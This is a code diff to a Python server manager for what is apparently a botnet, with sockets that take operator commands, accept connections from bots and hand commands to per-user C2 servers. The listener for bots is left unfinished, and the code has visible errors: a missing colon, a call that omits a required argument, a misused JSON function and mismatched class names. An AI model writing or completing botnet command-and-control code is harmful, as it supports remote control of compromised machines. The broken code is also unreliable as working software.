@@ -3,8 +3,9 @@ import socket
 import sys
 import json
 
-import Command
-import C2server
+import command
+import c2server
+from botnet_exceptions import *
 
 
 class ServerManager():
@@ -20,14 +21,7 @@ class ServerManager():
         Listen for incoming commands
         :return: None
         """
-        try:
-            commands_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            commands_socket.bind(self.command_entry_address)
-            commands_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            commands_socket.listen()
-        except:
-            print("[-] Commands socket setup failed")
-            sys.exit()
+        command_socket = self.create_socket(self.command_entry_address)
 
         while True:
             try:
@@ -37,7 +31,7 @@ class ServerManager():
                 break
 
             try:
-                command = command_socket.recv(1024))
+                command = command_socket.recv(1024)
                 command = json.load(command.decode())
                 command = Command(**command)
             except:
@@ -59,22 +53,36 @@ class ServerManager():
                 c2server = c2server_i
                 break
 
-        if c2server is not None:
-            command_socket.sendall(b'Command was properly processed')
-            c2server.execute_command(command)
-        else:
+        if c2server is None:
             c2server = self.spawn_c2server()
+
+        command_socket.sendall(b'Command was properly processed')
+        try:
             c2server.execute_command(command)
-
-        command_socket.close()
-
+        except NoBotsException:
+            command_socket.sendall(b'No bots available for this account')
+        else:
+            command_socket.sendall(b'Command executed')
+        finally:
+            command_socket.close()
 
     def listen_for_bots(self):
         """
         Listen for incoming bots
         :return: None
         """
-        pass
+        bots_socket = self.create_socket(self.bot_entry_address)
+
+        while True:
+            try:
+                bot_socket, bot_address = bots_socket.accept()
+            except:
+                print("[-] Accepting bot connection failed")
+                break
+
+            
+            
+
 
     def spawn_c2server(self, user_id):
         """
@@ -85,6 +93,18 @@ class ServerManager():
         c2server = C2server(user_id)
         self.c2servers.append(c2server)
         return c2server
+
+    def create_socket(self, address)
+        try:
+            commands_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            commands_socket.bind(address)
+            commands_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            commands_socket.listen()
+        except:
+            print("[-] Commands socket setup failed")
+            sys.exit()
+
+        return commands_socket
 
 
 
